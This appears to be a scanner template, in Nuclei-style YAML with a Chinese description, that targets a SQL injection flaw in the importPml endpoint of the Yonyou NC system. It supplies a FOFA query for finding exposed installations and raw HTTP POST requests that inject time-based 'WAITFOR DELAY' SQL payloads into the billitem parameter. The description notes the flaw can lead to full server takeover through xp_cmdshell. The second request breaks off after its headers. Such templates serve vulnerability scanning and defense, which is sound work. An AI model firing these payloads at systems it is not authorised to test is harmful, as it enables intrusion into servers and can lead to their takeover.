id: yongyouNC-importPml-sql-XVE-2023-29120

info:
  name: "用友NC系统importPml接口SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
      用友NC系统importPml接口存在SQL注入漏洞。攻击者可利用该漏洞通过数据库扩展存储过程xp_cmdshell执行任意系统命令，进而实现对目标服务器的完全控制。经技术分析，该漏洞攻击复杂度较低，建议受影响系统立即采取修复措施以消除安全风险。
  reference:
  - https://mp.weixin.qq.com/s/rhJ_fa5IW-sCAGidw5ul6A
  tags: 用友NC

http:
- raw:
  - |
    POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
    Connection: close

    ------WebKitFormBoundaryH970hbttBhoCyj9V
    Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
    Content-Type: image/jpeg

    <?xml version="1.0" encoding="UTF-8"?>
    <page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true" skin="webclassic" level="0"  linkgroup="0000z010000000000002"  ordernum="15">
    </page>
    ------WebKitFormBoundaryH970hbttBhoCyj9V--
  - |
    POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
